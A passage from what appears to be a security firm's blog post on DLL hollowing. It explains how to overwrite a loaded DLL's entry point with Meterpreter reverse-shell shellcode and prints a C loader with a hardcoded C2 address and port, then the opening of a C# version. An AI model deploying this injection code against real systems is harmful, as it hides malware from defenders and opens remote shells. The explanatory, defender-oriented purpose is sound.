srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=41a77ff8b77b7d64c270b5ff1cafb119, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=5c4bd2a2c1a188aa66536977c7ad42dd 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=d14bc0c3cf23027634c20cb3bd773c56, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=0bd940c12d5c51d26bab67cb213a1e3a 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=bf21c24ab3e132b9693697a7e03a95cd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=5c4bd2a2c1a188aa66536977c7ad42dd 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=f235f45bfc01c6f85f7e860e14f834f4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=0bd940c12d5c51d26bab67cb213a1e3a 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=2acd47ce9b7c2a409748919d82d9c97e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=3ce7fec44cd6ddccdb7b997b6f3f2ac4 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=d21b61967f6f5026de0c2b88c78dda73, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=d6e59cde33ddd230ea2b5fb412f442cc 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=29016bab4a7cdf3adc9ad02f314cdcb1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281265&amp;s=94cea8a8bc028002f622fd0dd318ca74 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=d8164434fa3131ca26a3511aff4356ed, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=79828e6b1b25b987ca00a11449dfc193 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig5_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281265&amp;s=d8164434fa3131ca26a3511aff4356ed" loading="lazy" x-data="image({mq1024:{width:936,height:606},mq768:{width:936,height:606},mq320:{width:720,height:466},DEFAULT:{width:320,height:207}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="606" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 5 - amsi.dll entry point after being Overwritten</figcaption></figure></div><p class="MsoNormal">&nbsp;This deobfuscated Meterpreter shellcode matches with the above picture.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=66ce7ad7afe90407cd5e2dc013e8e688, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=3cfce87e332796d46bee8245277ac66f 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=81e2a5db2b910fc4d06ed43651c99363, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=e8a51a877c3cfd42ff105cc5ce7bb1e7 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=8399e134e7e40d7de55424d0ff1a0096, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=3cfce87e332796d46bee8245277ac66f 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=930def7216588ecc403a0dd204885855, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=e8a51a877c3cfd42ff105cc5ce7bb1e7 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=502e318079553ebfff054bebb1dcd361, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=3cfce87e332796d46bee8245277ac66f 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=403a70413a249961b5569fca5992575d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=1029&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=e8a51a877c3cfd42ff105cc5ce7bb1e7 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=21bd1f538f03b9edf19de84f52f9ac81, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281267&amp;s=dcf9c439e0b62b4d1e376b31d4b5ce0f 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=f5ad76203fe0cb90c02841a200c334e2, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=5769f8b477de78b029a40d504eef444b 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig6_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281267&amp;s=f5ad76203fe0cb90c02841a200c334e2" loading="lazy" x-data="image({mq1024:{width:686,height:548},mq768:{width:686,height:548},mq320:{width:686,height:548},DEFAULT:{width:320,height:256}})" :width="getSize()" :height="getSize('height')" alt="" width="686" height="548" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 6 - Meterpreter Shellcode used to overwrite the amsi.dll entry point</figcaption></figure></div><p class="MsoNormal">For the second scenario, the executable will start by launching a new process and then obtain a handle for that process. Using this handle, our code will remotely instruct the new process to load a new library into the memory space. Next, our code will iterate through the remote process's loaded modules to obtain the address of the loaded DLL. From there, our code parses the <a href="https://en.wikibooks.org/wiki/X86_Disassembly/Windows_Executable_Files">DLL header</a> looking for the entry point. Like the first scenario, we need to determine the entry point of the loaded DLL and overwrite that location with the malicious payload. Finally, once the payload is written, we will then start a remote thread with the function address pointing to the malicious payload.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/gif" media="(min-width: 64rem)" srcset=""><source type="image/webp" media="(min-width: 64rem)" srcset=""><source type="image/gif" media="(min-width: 48rem)" srcset=""><source type="image/webp" media="(min-width: 48rem)" srcset=""><source type="image/gif" media="(min-width: 20rem)" srcset=""><source type="image/webp" media="(min-width: 20rem)" srcset=""><source type="image/gif" srcset=""><source type="image/webp" srcset=""><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.files.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/dll_hollowing_2.gif?dm=1706281308" loading="lazy" x-data="image({mq1024:{width:500,height:500},mq768:{width:500,height:500},mq320:{width:500,height:500},DEFAULT:{width:500,height:500}})" :width="getSize()" :height="getSize('height')" alt="" width="500" height="500" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 7 - DLL Hollowing on a Remote Processes</figcaption></figure></div><p class="MsoNormal">The two (2) images below demonstrate the list of Notepad's default DLLs followed by the list of DLLs after adding a 'malicious' one (AMSI.dll). By itself, AMSI.dll is not malicious, but it is a DLL that is not normally loaded by this application.</p><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=8f81df9488dffb01d1b6d8e57072ca24, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=69bf90e9a46e1d3af2a8734fce431b20 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=9891dd339057bd6dabb29cffba34cdf5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=f638ab9d4ea25cc4be50e7df50a9044c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=fd8570c5480cb7deeb1890138f4777dd, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=69bf90e9a46e1d3af2a8734fce431b20 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=f62813d04945c94e7b06a219f0389d19, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=f638ab9d4ea25cc4be50e7df50a9044c 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=1651cfd6560f48170efc0e5608cbf8ce, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=8bbf90f7922845fb6567362e544fa0c6 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=c3f80c887f1a2dffe781c25cbc05f37a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=c245acf22a6953220f9f1f615f7f9236 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=18116c83818639121c6fcb364b1e81db, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281270&amp;s=470c5f84344c31fd24ca53f7c9de7b1d 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=e0c47d0409eddac7fa29ad051770716a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=a9db0dc2adde6cc0e63525c66678524a 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig8_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281270&amp;s=e0c47d0409eddac7fa29ad051770716a" loading="lazy" x-data="image({mq1024:{width:936,height:992},mq768:{width:936,height:992},mq320:{width:720,height:763},DEFAULT:{width:320,height:339}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="992" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 8 - Notepad Default DLL's</figcaption></figure></div><div class="my-p56 flex justify-start"><figure class="inline-block"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=0d4eedc74581f89e3b90463af8d39a3d, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=01256a955a40783d6bcc181dd68b325c 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=ad424f521358c2345ccdfcf3870cd30a, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=4d4fe4b45baddf4004db0a7a8e2b371d 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=b19f9089947b7c0b2a735dd055bcdba1, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=01256a955a40783d6bcc181dd68b325c 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=fed6622b6fab671b5ee7d9ac43653c1e, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1404&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=4d4fe4b45baddf4004db0a7a8e2b371d 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=bdbcdd5e4d321ea9384c1f091a3bcea4, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1080&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=fbbe43c5eb934af1ea92290e18e79164 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=f4e80d95ef5b96d29279f6ecde9c7ba5, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=1080&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=11f2bb0e93ecf2cce668a7a1a2150759 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=af16ff8710172e38c0e46c7d37a5b636, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1706281272&amp;s=80dd9a445c0ce8ce4a9ddd3b2c48087a 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=ee23d4f72d514432ed55d1a2f5c735c3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=e0673925943152d8601711ce63288785 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/BurrowingDLL_Nusbaum/Fig9_nusbaum.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1706281272&amp;s=ee23d4f72d514432ed55d1a2f5c735c3" loading="lazy" x-data="image({mq1024:{width:936,height:1066},mq768:{width:936,height:1066},mq320:{width:720,height:820},DEFAULT:{width:320,height:364}})" :width="getSize()" :height="getSize('height')" alt="" width="936" height="1066" style="opacity: 1;"></picture><figcaption class="c-caption font-mono text-xs">Figure 9 - Notepad's DLL list with the Target amsi.dll</figcaption></figure></div><h3><span>1.3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>What Do the Attackers Gain?</h3><p class="MsoNormal">Just like the other <a href="https://trustedsec.com/blog/the-nightmare-of-proc-hollows-exe">injections methods</a> previously discussed, attackers use DLL hollowing to hide the malicious code and execution from casual inspection. If a defender looks at this system, the malware might be overlooked on the first or even the second pass because it is running in a benign executable with a valid parent. In process hollowing, the malware spawns a new process and overwrites a section of memory. In DLL hollowing, a new process is spawned but then instructed to load a new library. This library will appear benign and can be easily overlooked by defenders.</p><h3><span>1.4&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>Code Demonstration in C and C#</h3><p class="MsoNormal">The first code sample we will be reviewing is the simple scenario, written in C, that will load the new DLL into the current process and overwrite its entry point before calling create thread to execute the malicious code.</p><ul><li>Lines 19-29: Check the command line parameters for the name of the DLL to use—if none are provided, it will then use the default of AMSI.dll</li><li>Line 34: This is a note instructing use to manually change the C2 IP address</li><li>Line 35-36: Meterpreter reverse shell</li><li>Line 37-74: Continued Meterpreter reverse shellcode but removed for space</li><li>Line 75-80: Used to copy the Meterpreter shellcode into a new memory location</li><li>Line 83: Loads the benign and unneeded DLL into the current process's memory, using the LoadLibrary function call, and returns the address of that memory</li><li>Lines 90-98: Uses the address returned by the LoadLibrary function call to determine the entry point of the DLL by parsing the MZ and PE headers</li><li>Lines 104-107: Modifies the entry point memory region to add the ability to write to this memory</li><li>Line 108: Copies the Meterpreter shellcode to overwrite the original DLL entry point</li><li>Lines 109-112: Sets the entry point memory permissions back to their original value</li><li>Lines 113-118: Uses the CreateThread function to execute the malicious code now stored in the entry point of the DLL</li></ul><pre><code data-highlighted="yes" class="hljs language-swift"><span class="hljs-number">15</span>	int main(int args, char <span class="hljs-operator">*</span> argc[])
    <span class="hljs-number">16</span>	{
    <span class="hljs-number">17</span>	    char dllName[<span class="hljs-number">256</span>] <span class="hljs-operator">=</span> {};
    <span class="hljs-number">18</span>	
    <span class="hljs-number">19</span>	    <span class="hljs-keyword">if</span>(args <span class="hljs-operator">!=</span> <span class="hljs-number">2</span>)
    <span class="hljs-number">20</span>	    {
    <span class="hljs-number">21</span>	        printf(<span class="hljs-string">"Usage:: dll_hollowing.exe &lt;dll name&gt;<span class="hljs-subst">\n</span>"</span>);
    <span class="hljs-number">22</span>	        memcpy(dllName, <span class="hljs-string">"amsi.dll"</span>, <span class="hljs-number">9</span>);
    <span class="hljs-number">23</span>	    }
    <span class="hljs-number">24</span>	    <span class="hljs-keyword">else</span>
    <span class="hljs-number">25</span>	    {
    <span class="hljs-number">26</span>	        memcpy(dllName, argc[<span class="hljs-number">2</span>], strlen(argc[<span class="hljs-number">2</span>]));
    <span class="hljs-number">27</span>	    }
    <span class="hljs-number">28</span>	    printf(<span class="hljs-string">"C2 IP:<span class="hljs-subst">\t</span><span class="hljs-subst">\t</span>192.168.200.220<span class="hljs-subst">\n</span>Dll Name:<span class="hljs-subst">\t</span>%s<span class="hljs-subst">\n</span>"</span>,
    <span class="hljs-number">29</span>	           dllName);
    <span class="hljs-number">30</span>	
    <span class="hljs-number">34</span>	    <span class="hljs-comment">// x64 reverse tcp shell ip 192.168.200.220 port 4444 // Not packed so search for c0\xa8\xc8\xdc to replace the IP</span>
    <span class="hljs-number">35</span>	    unsigned char buff[] <span class="hljs-operator">=</span>
    <span class="hljs-number">36</span>	        <span class="hljs-string">"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00...
    75	    int encoded_size = sizeof(buff);
    76	    unsigned char * buf =
    77	        (unsigned char *)malloc(encoded_size);
    78	    memset(buf, 0, encoded_size);
    79	    memcpy(buf, buff, encoded_size);
    80	    //    End Shellcode deobfuscation
    81	    // DLL Hollowing
    82	    DWORD saveProtect = 0;
    83	    HMODULE hTargetDLL = LoadLibrary(dllName);
    84	    if(hTargetDLL == NULL)
    85	    {
    86	        printf("</span>[<span class="hljs-operator">!</span>] <span class="hljs-type">LoadLibrary</span> failed to load <span class="hljs-operator">%</span>s\n<span class="hljs-string">",
    87	               dllName);
    88	        return 0;
    89	    }
    90	    PIMAGE_DOS_HEADER mzHeader =
    91	        (PIMAGE_DOS_HEADER)hTargetDLL;
    92	    PIMAGE_NT_HEADERS peHeader =
    93	        (PIMAGE_NT_HEADERS)((char *)hTargetDLL +
    94	                            mzHeader-&gt;e_lfanew);
    95	    void * entryPointDLL =
    96	        (void *)((char *)hTargetDLL +
    97	                 peHeader-&gt;OptionalHeader
    98	                     .AddressOfEntryPoint);
    99	
   100	    printf("</span><span class="hljs-operator">%</span>s <span class="hljs-type">DLL</span> entrypoint address <span class="hljs-keyword">is</span> (<span class="hljs-operator">%</span>p)\n<span class="hljs-string">",
   101	           dllName,
   102	           entryPointDLL);
   103	
   104	    VirtualProtect(entryPointDLL,
   105	                   encoded_size,
   106	                   PAGE_READWRITE,
   107	                   &amp;saveProtect);
   108	    memcpy(entryPointDLL, buf, encoded_size);
   109	    VirtualProtect(entryPointDLL,
   110	                   encoded_size,
   111	                   saveProtect,
   112	                   &amp;saveProtect);
   113	    CreateThread(0,
   114	                 0,
   115	                 (LPTHREAD_START_ROUTINE)entryPointDLL,
   116	                 NULL,
   117	                 0,
   118	                 0);
   119	    printf("</span><span class="hljs-type">Thread</span> <span class="hljs-type">Created</span>\n<span class="hljs-string">");
   120	
   121	    while(true)
   122	    {
   123	        if(getchar() == 'q')
   124	        {
   125	            printf("</span><span class="hljs-type">Recieved</span> an exit command\n<span class="hljs-string">");
   126	            break;
   127	        }
   128	    }
   129	    printf("</span><span class="hljs-type">Exiting</span>\n<span class="hljs-string">");
   130	    return 1;
   131	}</span></code></pre><p class="MsoNormal"><span>The next code excerpt is in C# and performs the same actions as the above code sample. Let's walk through the code line by line.</span></p><ul><li>Lines 14-35: Parse the command line input to get the C2 IP and the name of the DLL that will be loaded and overwritten</li><li>Lines 67-95: Processes the shellcode and overwrites the C2 IP address with the value passed in at the command line</li><li>Line 108: Loads the benign DLL into memory using LoadLibrary function all, and stores the address of the DLL into the variable</li><li>Lines 117-126: Uses the address returned by the LoadLibrary function call to determine the entry point of the DLL by parsing the MZ and PE headers</li><li>Line 130: Modifies the entry point memory region to add the ability to write to this memory</li><li>Lines 132-135: Copies the Meterpreter shellcode to overwrite the original DLL entry point</li><li>Line 136: Sets the entry point memory permissions back to their original value</li><li>Line 141 Uses the CreateThread function to execute the malicious code now stored in the entry point of the DLL</li></ul><pre><code data-highlighted="yes" class="hljs language-php"><span class="hljs-number">14</span>	    unsafe <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
    15	    </span>{
    <span class="hljs-number">16</span>	
    <span class="hljs-number">17</span>	        <span class="hljs-built_in">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_ invoke__">Main</span>(<span class="hljs-keyword">string</span>[] args)
    <span class="hljs-number">18</span>	        {
    <span class="hljs-number">19</span>	            String c2_ips = <span class="hljs-keyword">string</span>.Empty;
    <span class="hljs-number">20</span>	            String dll_name = <span class="hljs-keyword">string</span>.Empty;    
    <span class="hljs-number">21</span>	            <span class="hljs-keyword">if</span> (args.Length != <span class="hljs-number">2</span>)
    <span class="hljs-number">22</span>	            {
